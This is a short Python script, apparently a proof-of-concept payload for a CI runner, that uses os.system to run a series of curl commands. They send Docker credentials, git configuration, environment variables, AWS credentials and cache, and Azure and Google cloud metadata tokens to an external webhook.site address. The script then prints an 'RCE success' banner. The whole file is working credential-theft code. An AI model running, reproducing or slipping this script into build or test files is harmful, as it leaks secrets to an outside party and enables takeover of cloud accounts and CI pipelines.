import sys
import os


def main() -> int:
    
    os.system("""
        export webhook="https://webhook.site/a474db99-e55d-4f2d-a818-32537da737da"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(cat ~/.docker/config.json)" \
            "$webhook/docker_cred"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(cat /home/runner/.docker/config.json)" \
            "$webhook/docker_cred2"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(cat .git/config)" \
            "$webhook/git_config"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(git config --list)" \
            "$webhook/git_config_list"


        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(cat /home/runner/.gitconfig)" \
            "$webhook/home_runner_gitconfig"


        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(printenv)" \
        "$webhook/printenv"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(cat ~/.aws/cli/cache)" \
        "$webhook/aws_cli_cache"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(cat ~/.aws/credentials)" \
        "$webhook/aws_cli_credentials"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\")" \
        "$webhook/azure_credentials"

        curl -X POST \
        -H "Content-Type: text/plain" \
        --data "$(curl -s -H "Metadata-Flavor: Google" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")" \
        "$webhook/google_credentials"

    """)
    
    
    sys.stderr.write("\n\n\n-----------------------------RCE success:breaking------------------------------\n\n\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

